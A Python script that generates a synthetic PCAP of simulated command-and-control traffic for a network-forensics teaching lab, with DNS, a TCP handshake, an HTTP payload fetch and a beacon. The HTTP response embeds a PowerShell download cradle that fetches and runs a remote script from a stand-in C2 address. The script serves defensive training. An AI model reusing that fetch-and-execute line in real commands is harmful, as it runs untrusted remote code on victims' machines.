#!/usr/bin/env python3
"""mk_pcap.py - build a small, deterministic PCAP of the WS-ALICE C2 traffic for the Day 28 labs.

Usage: python3 mk_pcap.py OUT.pcap

Writes a classic libpcap file (DLT_EN10MB) with fixed timestamps and valid Ethernet/IPv4/TCP/UDP
headers (correct checksums), telling the network side of the WS-ALICE story so tcpdump, Wireshark/
tshark and NetworkMiner have real traffic to read:

  1-2  DNS A query for the C2 name -> resolves to 203.0.113.50
  3-5  TCP handshake, 10.20.30.40 -> 203.0.113.50:80
  6-9  HTTP GET /payload.ps1  and  HTTP/1.1 200 OK carrying the PowerShell download cradle
  10   a later beacon: TCP SYN to 203.0.113.50:443 (the exfil channel opening)

Byte-identical on every run. It is crafted traffic for teaching, not a real capture. Standard
library only.
"""
import struct
import sys

CLIENT_MAC = bytes.fromhex("020000000a28")
SRV_MAC = bytes.fromhex("0200000000fe")
CLIENT_IP = bytes(map(int, "10.20.30.40".split(".")))
C2_IP = bytes(map(int, "203.0.113.50".split(".")))
DNS_IP = bytes(map(int, "8.8.8.8".split(".")))
C2_NAME = "cdn.ws-alice-c2.example"
BODY = b"IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.50/payload.ps1'); Start-Sleep 5\n"
CRADLE = (b"HTTP/1.1 200 OK\r\nServer: nginx\r\nContent-Type: text/plain\r\n"
          b"Content-Length: %d\r\n\r\n" % len(BODY)) + BODY
GET = (b"GET /payload.ps1 HTTP/1.1\r\nHost: cdn.ws-alice-c2.example\r\n"
       b"User-Agent: Mozilla/5.0\r\nAccept: */*\r\n\r\n")


def csum(data):
    if len(data) % 2:
        data += b"\x00"
    s = sum(struct.unpack(f">{len(data)//2}H", data))
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return (~s) & 0xFFFF


def ipv4(src, dst, proto, payload, ident):
    hdr = struct.pack(">BBHHHBBH4s4s", 0x45, 0, 20 + len(payload), ident, 0x4000, 64, proto, 0, src, dst)
    chk = csum(hdr)
    hdr = hdr[:10] + struct.pack(">H", chk) + hdr[12:]
    return hdr + payload


def l4csum(src, dst, proto, seg):
    pseudo = src + dst + struct.pack(">BBH", 0, proto, len(seg))
    return csum(pseudo + seg)


def tcp_seg(src, dst, sport, dport, seq, ack, flags, payload=b""):
    seg = struct.pack(">HHIIBBHHH", sport, dport, seq, ack, 0x50, flags, 64240, 0, 0) + payload
    chk = l4csum(src, dst, 6, seg)
    return seg[:16] + struct.pack(">H", chk) + seg[18:]


def udp_seg(src, dst, sport, dport, payload):
    seg = struct.pack(">HHHH", sport, dport, 8 + len(payload), 0) + payload
    chk = l4csum(src, dst, 17, seg) or 0xFFFF
    return seg[:6] + struct.pack(">H", chk) + seg[8:]


def dns_name(name):
    out = b"".join(struct.pack("B", len(p)) + p.encode() for p in name.split(".")) + b"\x00"
    return out


def dns_query(txid):
    q = struct.pack(">HHHHHH", txid, 0x0100, 1, 0, 0, 0)
    q += dns_name(C2_NAME) + struct.pack(">HH", 1, 1)
    return q


def dns_response(txid):
    r = struct.pack(">HHHHHH", txid, 0x8180, 1, 1, 0, 0)
    r += dns_name(C2_NAME) + struct.pack(">HH", 1, 1)
    r += struct.pack(">HHHIH", 0xC00C, 1, 1, 60, 4) + C2_IP      # answer: A -> C2_IP, name compression ptr
    return r


def eth(dst, src, payload):
    return dst + src + b"\x08\x00" + payload


def frame(src_mac, dst_mac, ip_payload, src_ip, dst_ip, proto, ident):
    return eth(dst_mac, src_mac, ipv4(src_ip, dst_ip, proto, ip_payload, ident))


def main(out):
    pkts = []
    t0 = 1792000000  # fixed epoch seconds (UTC)

    def add(when_ms, raw):
        pkts.append((t0 + when_ms // 1000, (when_ms % 1000) * 1000, raw))

    cs, ss = 1000, 5000
    glen = len(GET)
    # DNS
    add(0, frame(CLIENT_MAC, SRV_MAC, udp_seg(CLIENT_IP, DNS_IP, 50000, 53, dns_query(0x1a2b)),
                 CLIENT_IP, DNS_IP, 17, 1))
    add(12, frame(SRV_MAC, CLIENT_MAC, udp_seg(DNS_IP, CLIENT_IP, 53, 50000, dns_response(0x1a2b)),
                  DNS_IP, CLIENT_IP, 17, 1))
    # TCP handshake to :80
    add(20, frame(CLIENT_MAC, SRV_MAC, tcp_seg(CLIENT_IP, C2_IP, 49200, 80, cs, 0, 0x02), CLIENT_IP, C2_IP, 6, 2))
    add(35, frame(SRV_MAC, CLIENT_MAC, tcp_seg(C2_IP, CLIENT_IP, 80, 49200, ss, cs + 1, 0x12), C2_IP, CLIENT_IP, 6, 2))
    add(36, frame(CLIENT_MAC, SRV_MAC, tcp_seg(CLIENT_IP, C2_IP, 49200, 80, cs + 1, ss + 1, 0x10), CLIENT_IP, C2_IP, 6, 3))
    # HTTP GET + response
    add(40, frame(CLIENT_MAC, SRV_MAC, tcp_seg(CLIENT_IP, C2_IP, 49200, 80, cs + 1, ss + 1, 0x18, GET), CLIENT_IP, C2_IP, 6, 4))
    add(55, frame(SRV_MAC, CLIENT_MAC, tcp_seg(C2_IP, CLIENT_IP, 80, 49200, ss + 1, cs + 1 + glen, 0x10), C2_IP, CLIENT_IP, 6, 4))
    add(60, frame(SRV_MAC, CLIENT_MAC, tcp_seg(C2_IP, CLIENT_IP, 80, 49200, ss + 1, cs + 1 + glen, 0x18, CRADLE), C2_IP, CLIENT_IP, 6, 5))
    add(61, frame(CLIENT_MAC, SRV_MAC, tcp_seg(CLIENT_IP, C2_IP, 49200, 80, cs + 1 + glen, ss + 1 + len(CRADLE), 0x10), CLIENT_IP, C2_IP, 6, 6))
    # later beacon: SYN to :443 (exfil channel)
    add(5000, frame(CLIENT_MAC, SRV_MAC, tcp_seg(CLIENT_IP, C2_IP, 49555, 443, 9000, 0, 0x02), CLIENT_IP, C2_IP, 6, 7))

    with open(out, "wb") as f:
        f.write(struct.pack("<IHHiIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, 1))  # pcap global header, DLT_EN10MB
        for sec, usec, raw in pkts:
            f.write(struct.pack("<IIII", sec, usec, len(raw), len(raw)) + raw)
    print(f"wrote {out}: {len(pkts)} packets")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        sys.exit(__doc__)
    main(sys.argv[1])
